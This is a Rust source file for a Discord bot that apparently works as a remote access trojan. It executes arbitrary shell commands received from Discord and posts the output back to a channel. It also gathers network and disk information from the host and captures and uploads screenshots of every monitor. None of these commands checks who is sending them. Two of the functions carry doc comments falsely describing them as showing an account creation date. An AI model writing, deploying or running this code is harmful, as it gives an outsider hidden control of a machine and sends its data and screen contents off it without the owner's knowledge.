use poise::serenity_prelude as serenity;
use serenity::all::{CreateAttachment, CreateMessage};
use std::process::Command;
use xcap::Monitor;

struct Data {} // User data, which is stored and accessible in all command invocations
type Error = Box<dyn std::error::Error + Send + Sync>;
type Context<'a> = poise::Context<'a, Data, Error>;

/// Displays your or another user's account creation date
#[poise::command(prefix_command, track_edits)]
async fn cmd(
    ctx: Context<'_>,
    #[description = "command to send"] cmd: poise::CodeBlock,
) -> Result<(), Error> {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &cmd.code])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd.code)
            .output()
            .expect("failed to execute process")
    };

    if output.stdout.len() > 2000 - 8 {
        let files = [CreateAttachment::bytes(output.stdout, "out.txt")];
        ctx.channel_id()
            .send_files(ctx.http(), files, CreateMessage::new())
            .await?;
    } else {
        let resp: String = output.stdout.iter().map(|&v| v as char).collect();
        ctx.say(format!("```\n{}\n```", resp)).await?;
    }

    Ok(())
}

/// Displays your or another user's account creation date
#[poise::command(slash_command, prefix_command)]
async fn info(ctx: Context<'_>) -> Result<(), Error> {
    let commands = if cfg!(target_os = "windows") {
        vec!["ipconfig"]
    } else {
        vec!["uname -a", "ip a", "lsblk"]
    };

    for cmd in commands {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", cmd])
                .output()
                .expect("failed to execute process")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()
                .expect("failed to execute process")
        };

        if output.stdout.len() > 2000 - 8 {
            let files = [CreateAttachment::bytes(output.stdout, "out.txt")];
            ctx.channel_id()
                .send_files(ctx.http(), files, CreateMessage::new())
                .await?;
        } else {
            let resp: String = output.stdout.iter().map(|&v| v as char).collect();
            ctx.say(format!("```\n{}\n```", resp)).await?;
        }
    }

    Ok(())
}

/// Take a screenshot of the desktop
#[poise::command(slash_command, prefix_command)]
async fn screenshot(ctx: Context<'_>) -> Result<(), Error> {
    for mon in Monitor::all().unwrap() {
        mon.capture_image().unwrap().save("cap.png").unwrap();
        let files = [CreateAttachment::path("cap.png").await?];
        ctx.channel_id()
            .send_files(ctx.http(), files, CreateMessage::new())
            .await?;
    }
    ctx.say("Desktop").await?;
    Ok(())
}

// Help menu
#[poise::command(slash_command, prefix_command)]
pub async fn help(ctx: Context<'_>, command: Option<String>) -> Result<(), Error> {
    let configuration = poise::builtins::HelpConfiguration {
        // [configure aspects about the help message here]
        ..Default::default()
    };
    poise::builtins::help(ctx, command.as_deref(), configuration).await?;
    Ok(())
}

#[poise::command(prefix_command)]
pub async fn register(ctx: Context<'_>) -> Result<(), Error> {
    poise::builtins::register_application_commands_buttons(ctx).await?;
    Ok(())
}

#[tokio::main]
async fn main() {
    let token = std::env::var("DISCORD_TOKEN").expect("missing DISCORD_TOKEN");
    let intents = serenity::GatewayIntents::non_privileged();

    let framework = poise::Framework::builder()
        .options(poise::FrameworkOptions {
            commands: vec![cmd(), info(), screenshot(), register(), help()],
            ..Default::default()
        })
        .setup(|ctx, _ready, framework| {
            Box::pin(async move {
                poise::builtins::register_globally(ctx, &framework.options().commands).await?;
                Ok(Data {})
            })
        })
        .build();

    let client = serenity::ClientBuilder::new(token, intents)
        .framework(framework)
        .await;
    client.unwrap().start().await.unwrap();
}
